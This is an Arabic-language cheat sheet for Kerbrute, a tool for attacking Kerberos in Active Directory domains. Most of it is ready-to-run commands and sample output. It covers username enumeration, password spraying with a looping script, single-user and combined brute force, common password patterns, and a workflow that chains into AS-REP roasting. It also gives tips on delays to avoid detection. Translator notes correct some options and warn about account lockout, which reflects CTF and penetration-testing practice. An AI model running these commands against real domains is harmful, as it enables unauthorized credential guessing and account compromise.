<a id="-kerbrute---kerberos-user-enumeration"></a>
# 🔑 Kerbrute - تعداد مستخدمي Kerberos

<!-- language-home-navigation -->
[🏠 الصفحة الرئيسية العربية](../../README.ar.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ██╗  ██╗███████╗██████╗ ██████╗ ██████╗ ██╗   ██╗████████╗███████╗
  ██║ ██╔╝██╔════╝██╔══██╗██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝
  █████╔╝ █████╗  ██████╔╝██████╔╝██████╔╝██║   ██║   ██║   █████╗  
  ██╔═██╗ ██╔══╝  ██╔══██╗██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝  
  ██║  ██╗███████╗██║  ██║██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗
  ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝
           Kerberos Pre-Auth Bruteforcing Tool
```

<p align="center">
  <img src="https://img.shields.io/badge/Kerbrute-Kerberos-red?style=for-the-badge" alt="Kerbrute">
  <img src="https://img.shields.io/badge/User_Enumeration-blue?style=for-the-badge" alt="Enum">
  <img src="https://img.shields.io/badge/Password_Spray-green?style=for-the-badge" alt="Spray">
</p>

يعرض الشعار اسم Kerbrute ووظيفته في اختبار المصادقة المسبقة لبروتوكول Kerberos.

---

<a id="-table-of-contents"></a>
## 📋 المحتويات

- [ما هو Kerbrute](#-what-is-kerbrute)
- [التثبيت](#-installation)
- [تعداد المستخدمين](#-user-enumeration)
- [رش كلمات المرور (Password Spraying)](#-password-spraying)
- [التخمين الشامل (Brute Force)](#-brute-force)
- [مرجع سريع](#-quick-reference)

---

<a id="-what-is-kerbrute"></a>
## 🎯 ما هو Kerbrute

**Kerbrute** يستفيد من آلية المصادقة المسبقة في Kerberos لتعداد المستخدمين ورش كلمات المرور:

- 🔍 **تعداد المستخدمين** - العثور على أسماء مستخدمين صحيحة دون بيانات اعتماد!
- 🔐 **رش كلمات المرور** - اختبار كلمة مرور واحدة على عدد كبير من المستخدمين
- 💥 **التخمين الشامل** - اختبار مجموعات بيانات الاعتماد
- 🚫 **دون خطر قفل الحساب** - إخفاقات المصادقة المسبقة لا تؤدي إلى قفل الحسابات

<a id="why-kerbrute"></a>
### لماذا Kerbrute؟

> **تصحيح جوهري للأصل:** يخص غياب إخفاقات تسجيل الدخول تعداد المستخدمين دون إرسال مصادقة مسبقة. أما `passwordspray` و`bruteuser` و`bruteforce` فقد تزيد عداد الإخفاقات وتقفل الحسابات. لذلك لا تعمم عبارة «دون خطر قفل الحساب» أو صف الجدول أدناه على اختبار كلمات المرور. ويمكن أن تنشأ أحداث Kerberos مثل `4768` و`4771` حسب العملية وإعداد التدقيق. [التوثيق الرسمي](https://github.com/ropnop/kerbrute).

| الطريقة | يؤدي إلى قفل الحساب | إنشاء سجلات |
| -------- | ------------------ | ---------------- |
| ربط LDAP | نعم | نعم |
| مصادقة SMB | نعم | نعم |
| **المصادقة المسبقة لـ Kerberos** | **لا** | قليل |

---

<a id="-installation"></a>
## 🚀 التثبيت

<a id="download-binary"></a>
### تنزيل الملف التنفيذي

```bash
# Linux
wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64
chmod +x kerbrute_linux_amd64
mv kerbrute_linux_amd64 /usr/local/bin/kerbrute

# Windows ‏(PowerShell)
Invoke-WebRequest -Uri "https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_amd64.exe" -OutFile kerbrute.exe
```

<a id="from-source"></a>
### التثبيت من الشيفرة المصدرية

```bash
go install github.com/ropnop/kerbrute@latest
```

<a id="verify"></a>
### التحقق

```bash
kerbrute --help
```

---

<a id="-user-enumeration"></a>
## 🔍 تعداد المستخدمين

<a id="basic-usage"></a>
### الاستخدام الأساسي

```bash
# تعداد المستخدمين من قائمة أسماء
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt

# باستخدام اسم مضيف وحدة التحكم بالمجال
kerbrute userenum -d domain.local --dc dc01.domain.local users.txt
```

<a id="output-options"></a>
### خيارات المخرجات

> **ملاحظة توافق:** لا يعرّف المصدر الرسمي الخيار `--json` الوارد في المثال. كما أن `-o` يحفظ **سجل الأداة**، وليس قائمة أسماء مجردة. [تعريف الخيارات](https://github.com/ropnop/kerbrute/blob/master/cmd/kerbrute.go) و[تنسيق السجل](https://github.com/ropnop/kerbrute/blob/master/util/log.go).

```bash
# مخرجات تفصيلية
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt -v

# حفظ المخرجات في ملف
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt -o valid_users.txt

# مخرجات JSON
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt --json -o results.json
```

<a id="threading"></a>
### خيوط التنفيذ

> **توضيح:** تصف وثائق `--delay` استخدام خيط واحد عند تفعيله؛ لذا لا تفترض تزامن `-t 20` مع التأخير كما قد يوحي الأصل. التأخير وحده لا يضمن تجنب القفل أو الرصد. [التوثيق الرسمي](https://github.com/ropnop/kerbrute).

```bash
# زيادة خيوط التنفيذ (الافتراضي: 10)
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt -t 50

# خيوط تنفيذ بحذر
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt -t 20 --delay 100
```

<a id="sample-output"></a>
### مثال على المخرجات

```
2024/01/15 10:30:00 >  [+] VALID USERNAME:    admin@domain.local
2024/01/15 10:30:01 >  [+] VALID USERNAME:    john@domain.local
2024/01/15 10:30:02 >  [+] VALID USERNAME:    svc_sql@domain.local
```

تبيّن هذه المخرجات أسماء حسابات صحيحة في المجال مع الطابع الزمني لكل نتيجة؛ بقي نص الأداة كما هو.

---

<a id="-password-spraying"></a>
## 🔐 رش كلمات المرور (Password Spraying)

<a id="basic-spray"></a>
### الرش الأساسي

```bash
# اختبار كلمة مرور واحدة على المستخدمين
kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt 'Password123!'

# من ملف
kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt 'Summer2024!'
```

<a id="multiple-passwords"></a>
### كلمات مرور متعددة

```bash
# رش عدة كلمات مرور (واحدة في كل مرة!)
for pass in $(cat passwords.txt); do
    echo "Trying: $pass"
    kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt "$pass"
    sleep 300  # الانتظار 5 دقائق بين جولات الرش
done
```

<a id="output"></a>
### المخرجات

```bash
# حفظ بيانات الاعتماد الصحيحة
kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt 'Pass123!' -o valid_creds.txt
```

<a id="sample-output-1"></a>
### مثال على المخرجات

```
2024/01/15 10:35:00 >  [+] VALID LOGIN:    john@domain.local:Password123!
2024/01/15 10:35:01 >  [+] VALID LOGIN:    admin@domain.local:Password123!
```

يشير `VALID LOGIN` في المثال إلى نجاح بيانات اعتماد الحساب، ويعرض اسم المستخدم وكلمة المرور كما وردا في المخرجات الأصلية.

<a id="safe-spraying"></a>
### رش كلمات المرور بحذر

> **تصحيح لخيار CME:** لا يعرّف محلل LDAP في CrackMapExec الأصلي الخيار `--password-policy` الوارد أدناه. أبقي المثال التاريخي دون تعديل؛ راجع [تعريف الخيارات الرسمي](https://github.com/byt3bl33d3r/CrackMapExec/blob/master/cme/protocols/ldap/proto_args.py) و[المرجع العربي لـ CrackMapExec](../../CrackMapExec/translations/README.ar.md).

> لا تجعل وقفة `300` ثانية أو أوصاف «بحذر» الأمثلة آمنة من القفل تلقائيا؛ يلزم فهم سياسة الحسابات. يوقف `--safe` المحاولات عند الإبلاغ عن حساب مقفل، ولا يمنع القفل الأول. [وصف الخيار الرسمي](https://github.com/ropnop/kerbrute).

```bash
# فحص سياسة كلمات المرور أولا!
crackmapexec ldap DC01 -u user -p pass --password-policy

# محاولات قليلة وبطيئة
kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt 'Pass!' -t 5 --delay 500
```

---

<a id="-brute-force"></a>
## 💥 التخمين الشامل (Brute Force)

<a id="full-brute-force"></a>
### التخمين الشامل الكامل

> **تصحيح للتعليق:** يختبر `bruteuser` كلمات مرور عدة لمستخدم واحد (`admin` هنا)، ولا يختبر جميع تركيبات المستخدمين وكلمات المرور. [تعريف الأوامر الرسمي](https://github.com/ropnop/kerbrute).

```bash
# اختبار جميع مجموعات username:password
kerbrute bruteuser -d domain.local --dc 10.10.10.10 passwords.txt admin
```

<a id="combined-list"></a>
### قائمة تجمع المستخدمين وكلمات المرور

```bash
# استخدام تنسيق username:password
kerbrute bruteforce -d domain.local --dc 10.10.10.10 creds.txt

# تنسيق creds.txt:
# admin:Password1
# john:Summer2024
```

---

<a id="-quick-reference"></a>
## 📊 مرجع سريع

<a id="commands"></a>
### الأوامر

| الأمر | الوصف |
| --------- | ------------- |
| `userenum` | تعداد أسماء المستخدمين الصحيحة |
| `passwordspray` | اختبار كلمة مرور على المستخدمين |
| `bruteuser` | تخمين كلمة مرور مستخدم واحد |
| `bruteforce` | اختبار مجموعات user:pass |

<a id="essential-options"></a>
### الخيارات الأساسية

| الخيار | الوصف |
| -------- | ------------- |
| `-d` | اسم المجال |
| `--dc` | عنوان IP أو اسم مضيف وحدة التحكم بالمجال |
| `-t` | خيوط التنفيذ (الافتراضي: 10) |
| `-o` | ملف المخرجات |
| `-v` | مخرجات تفصيلية |
| `--delay` | تأخير بين المحاولات (مللي ثانية) |

<a id="user-enumeration"></a>
### تعداد المستخدمين

```bash
# الأساسي
kerbrute userenum -d DOMAIN --dc DC_IP users.txt

# مع حفظ المخرجات
kerbrute userenum -d DOMAIN --dc DC_IP users.txt -o valid.txt

# سريع
kerbrute userenum -d DOMAIN --dc DC_IP users.txt -t 50
```

<a id="password-spray"></a>
### رش كلمات المرور

```bash
# رش أساسي
kerbrute passwordspray -d DOMAIN --dc DC_IP users.txt 'Password!'

# رش بحذر
kerbrute passwordspray -d DOMAIN --dc DC_IP users.txt 'Pass!' -t 5 --delay 500
```

<a id="wordlists-for-user-enum"></a>
### قوائم أسماء لتعداد المستخدمين

```bash
# أسماء شائعة
/usr/share/seclists/Usernames/Names/names.txt

# أسماء المستخدمين الأكثر شيوعا
/usr/share/seclists/Usernames/top-usernames-shortlist.txt

# تنسيق مخصص
echo -e "administrator\nadmin\nuser\njohn\njane" > users.txt
```

<a id="common-passwords"></a>
### كلمات مرور شائعة

```
الفصل+السنة: Summer2024!, Winter2024!, Fall2024!
الشركة+رقم: CompanyName123!, Company2024!
عامة: Password1, Welcome1, P@ssw0rd
```

---

<a id="-ctf-tips"></a>
## 🎯 نصائح لتحديات CTF

1. **ابدأ دائما بالتعداد** - العثور على أسماء المستخدمين دون بيانات اعتماد!
2. **افحص AS-REP** - بعد العثور على المستخدمين، تحقق ممن لا تشترط حساباتهم المصادقة المسبقة
3. **رش كلمات المرور بحذر** - كلمة مرور واحدة ثم انتظار
4. **افحص السياسة** - اعرف حد المحاولات الذي يؤدي إلى قفل الحساب
5. **استخدم التأخير** - لتفادي الرصد

<a id="workflow"></a>
### خطوات العمل

> **توضيح لتدفق الملفات:** الملف `users.txt` الناتج عن `-o` سجل مؤرخ يتضمن رسائل الأداة؛ لا يفترض أنه صالح مباشرة بوصفه قائمة أسماء لـ `GetNPUsers.py` في الخطوة التالية. أبقيت الأوامر كما وردت للمقارنة. [تنسيق ملف السجل الرسمي](https://github.com/ropnop/kerbrute/blob/master/util/log.go).

```bash
# 1. تعداد المستخدمين
kerbrute userenum -d domain.local --dc 10.10.10.10 names.txt -o users.txt

# 2. فحص الحسابات القابلة لاستخراج AS-REP
GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip 10.10.10.10 -no-pass

# 3. رش كلمات المرور
kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt 'Summer2024!'
```

---

<a id="-resources"></a>
## 📚 المصادر

- [مستودع Kerbrute على GitHub](https://github.com/ropnop/kerbrute)
- [مدونة ropnop](https://blog.ropnop.com/)

<a id="related-cheatsheets"></a>
### أوراق مرجعية ذات صلة
- [منهجية اختبار Active Directory](../../AD-Attack-Methodology/translations/README.ar.md)
- [Rubeus](../../Rubeus/translations/README.ar.md)
- [CrackMapExec](../../CrackMapExec/translations/README.ar.md)

---

<p align="center">
  <b>🔑 عدّد المستخدمين واختبر رش كلمات المرور!</b><br>
  <i>Kerbrute - أسلوب متخفّ للوصول</i>
</p>
